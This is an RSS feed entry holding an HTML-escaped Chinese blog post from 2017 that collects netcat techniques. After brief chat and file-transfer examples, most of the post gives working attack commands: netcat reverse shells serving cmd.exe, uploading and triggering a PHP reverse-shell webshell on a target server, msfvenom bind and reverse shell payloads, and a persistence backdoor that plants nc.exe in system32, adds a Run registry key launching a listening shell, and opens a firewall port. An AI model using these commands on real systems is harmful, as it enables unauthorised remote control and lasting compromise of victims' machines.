-          
-            <item>  
-               <title>Netcat常用方法汇总</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#netcat常用方法汇总&quot; id=&quot;markdown-toc-netcat常用方法汇总&quot;&gt;Netcat常用方法汇总&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-基本使用&quot; id=&quot;markdown-toc-1-基本使用&quot;&gt;1. 基本使用&lt;/a&gt;        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#11-聊天工具&quot; id=&quot;markdown-toc-11-聊天工具&quot;&gt;1.1 聊天工具&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#12-文件传输&quot; id=&quot;markdown-toc-12-文件传输&quot;&gt;1.2 文件传输&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#13-反向后门&quot; id=&quot;markdown-toc-13-反向后门&quot;&gt;1.3 反向后门&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-综合使用&quot; id=&quot;markdown-toc-2-综合使用&quot;&gt;2. 综合使用&lt;/a&gt;        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#21-结合php反向后门&quot; id=&quot;markdown-toc-21-结合php反向后门&quot;&gt;2.1 结合php反向后门&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#22-结合msfvenom使用&quot; id=&quot;markdown-toc-22-结合msfvenom使用&quot;&gt;2.2 结合msfvenom使用&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#23-做持久化后门使用&quot; id=&quot;markdown-toc-23-做持久化后门使用&quot;&gt;2.3 做持久化后门使用&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;netcat常用方法汇总&quot;&gt;Netcat常用方法汇总&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-基本使用&quot;&gt;1. 基本使用&lt;/h2&gt;
-
-&lt;h3 id=&quot;11-聊天工具&quot;&gt;1.1 聊天工具&lt;/h3&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 服务端&lt;/span&gt;
-nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
-&lt;span class=&quot;c&quot;&gt;# 客户端&lt;/span&gt;
-nc 192.168.1.15 5678
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;12-文件传输&quot;&gt;1.2 文件传输&lt;/h3&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 接收端&lt;/span&gt;
-nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5555 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; a.zip
-&lt;span class=&quot;c&quot;&gt;# 发送端&lt;/span&gt;
-nc 192.168.1.5 5678 &amp;lt; cms.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;13-反向后门&quot;&gt;1.3 反向后门&lt;/h3&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 监听端&lt;/span&gt;
-nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 5678
-&lt;span class=&quot;c&quot;&gt;# 控制端&lt;/span&gt;
-nc 192.168.1.5 5678 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;2-综合使用&quot;&gt;2. 综合使用&lt;/h2&gt;
-
-&lt;h3 id=&quot;21-结合php反向后门&quot;&gt;2.1 结合php反向后门&lt;/h3&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 控制端启动监听&lt;/span&gt;
-nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;编辑php反弹shell后门，&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /usr/share/webshells/php/php-reverse-shell.php&lt;/code&gt;，修改 &lt;strong&gt;$ip&lt;/strong&gt; 和 &lt;strong&gt;$port&lt;/strong&gt; 为控制端的地址和端口
-将 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件上传至目标服务器中，通过浏览器触发 &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; 文件路径，在nc终端中的到反弹shell&lt;/p&gt;
-
-&lt;h3 id=&quot;22-结合msfvenom使用&quot;&gt;2.2 结合msfvenom使用&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;windows/shell_hidden_bind_tcp&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_hidden_bind_tcp &lt;span class=&quot;nv&quot;&gt;ahost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
-nc 192.168.0.103 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;windows/shell_reverse_tcp&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p windows/shell_reverse_tcp  &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.0.107 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8888 –f exe &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; root.exe
-nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 8888
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;23-做持久化后门使用&quot;&gt;2.3 做持久化后门使用&lt;/h3&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 将nc.exe上传至目标服务器中指定目录&lt;/span&gt;
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; upload /usr/share/windows-binaries/nc.exe C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;system32
-
-&lt;span class=&quot;c&quot;&gt;# 切换到目标cmd环境&lt;/span&gt;
-msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
-
-&lt;span class=&quot;c&quot;&gt;# 添加自启动注册表项&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; reg setval &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; HKLM&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;software&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;microsoft&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;currentversion&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; netcat &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# 添加nc出入站防火墙规则&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh advfirewall firewall add rule &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'netcat'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;allow &lt;span class=&quot;nv&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Tcp &lt;span class=&quot;nv&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4445
-
-&lt;span class=&quot;c&quot;&gt;# 检查nc防火墙是否已经开放&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; netsh firewall show portopening
-
-&lt;span class=&quot;c&quot;&gt;# 重启目标电脑，使用nc连接&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; 192.168.0.101 4445
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>  
-               <pubDate>Sat, 11 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/netcat-general/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/netcat-general/</guid>  
                </item>  
           
     </channel>  
